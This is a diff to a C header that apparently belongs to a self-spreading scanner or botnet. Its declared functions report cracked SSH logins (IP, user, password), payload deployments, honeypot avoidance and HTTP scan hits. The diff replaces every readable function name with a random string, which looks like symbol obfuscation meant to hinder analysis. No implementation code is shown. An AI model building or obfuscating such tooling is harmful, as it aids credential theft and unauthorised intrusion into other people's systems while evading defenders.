@@ -31,18 +31,18 @@
 #define SR_HTTP_DONE       0x11  /* [total:4 BE][miss:4 BE][fail:4 BE] */
 
 /* Init the report buffer; call once from child after fork */
-void sr_init(int write_fd);
+void vC8Yg5i(int write_fd);
 
 /* Flush buffered messages to the pipe as a single SR: line */
-void sr_flush(void);
+void ku8gj5o(void);
 
 /* SSH messages */
-void sr_ssh_hit(uint32_t ip, const char *user, const char *pass);
-void sr_ssh_deployed(uint32_t ip);
-void sr_ssh_deploy_fail(uint32_t ip);
-void sr_ssh_progress(uint32_t current, uint32_t total);
-void sr_ssh_done(uint32_t total, uint16_t skipped, uint16_t honeypots, uint16_t hpots_probe);
+void tP6Uf6v(uint32_t ip, const char *user, const char *pass);
+void Da2yh8c(uint32_t ip);
+void Tt8yX7B(uint32_t ip);
+void Ux7my2G(uint32_t current, uint32_t total);
+void yd7bZ4a(uint32_t total, uint16_t skipped, uint16_t honeypots, uint16_t hpots_probe);
 
 /* HTTP messages */
-void sr_http_hit(uint32_t ip, uint16_t status_code);
-void sr_http_done(uint32_t total, uint32_t misses, uint32_t fails);
+void Mp8Qh2e(uint32_t ip, uint16_t status_code);
+void mG4qi2p(uint32_t total, uint32_t misses, uint32_t fails);
